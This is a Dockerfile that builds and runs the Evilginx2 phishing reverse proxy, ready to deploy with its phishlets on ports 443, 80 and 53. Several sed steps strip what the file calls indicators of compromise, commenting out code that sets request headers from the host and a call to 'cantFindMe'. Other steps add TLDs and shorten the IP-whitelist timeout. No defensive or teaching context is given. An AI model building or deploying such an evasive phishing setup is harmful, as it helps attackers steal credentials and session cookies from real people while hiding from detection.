ARG EVILGINX_BIN="/bin/evilginx"

# Stage 1 - Build EvilGinx2 app
FROM alpine:latest AS build

LABEL maintainer="froyo75@users.noreply.github.com"

ARG GOLANG_VERSION=1.16
ARG GOPATH=/opt/go
ARG GITHUB_USER="kgretzky"
ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ARG INSTALL_PACKAGES="go git bash"
ARG PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ARG EVILGINX_BIN

RUN apk add --no-cache ${INSTALL_PACKAGES}

# Install & Configure Go
RUN set -ex \
    && wget https://dl.google.com/go/go${GOLANG_VERSION}.src.tar.gz && tar -C /usr/local -xzf go$GOLANG_VERSION.src.tar.gz \
    && rm go${GOLANG_VERSION}.src.tar.gz \
    && cd /usr/local/go/src && ./make.bash \
# Clone EvilGinx2 Repository
    && mkdir -pv ${GOPATH}/src/github.com/${GITHUB_USER} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://${EVILGINX_REPOSITORY}

# Remove IOCs
RUN set -ex \
    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' \
     -e 's/e_host := req.Host/\/\/e_host := req.Host/g' \
     -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' \
     -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
     -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go

# Add "security" & "tech" TLD
RUN set -ex \
    && sed -i 's/arpa/tech\|security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go

# Add date to EvilGinx2 log
RUN set -ex \
    && sed -i 's/"%02d:%02d:%02d", t.Hour()/"%02d\/%02d\/%04d - %02d:%02d:%02d", t.Day(), int(t.Month()), t.Year(), t.Hour()/g' ${PROJECT_DIR}/log/log.go

# Set "whitelistIP" timeout to 10 seconds
RUN set -ex \
    && sed -i 's/10 \* time.Minute/10 \* time.Second/g' ${PROJECT_DIR}/core/http_proxy.go

# Build EvilGinx2
WORKDIR ${PROJECT_DIR}
RUN set -x \
    && go get -v && go build -v \
    && cp -v evilginx2 ${EVILGINX_BIN} \
    && mkdir -v /app && cp -vr phishlets /app

# Stage 2 - Build Runtime Container
FROM alpine:latest

LABEL maintainer="froyo75@users.noreply.github.com"

ENV EVILGINX_PORTS="443 80 53/udp"
ARG EVILGINX_BIN

RUN apk add --no-cache bash && mkdir -v /app

# Install EvilGinx2
WORKDIR /app
COPY --from=build ${EVILGINX_BIN} ${EVILGINX_BIN}
COPY --from=build /app .

# Configure Runtime Container
EXPOSE ${EVILGINX_PORTS}

CMD [${EVILGINX_BIN}, "-p", "/app/phishlets"]
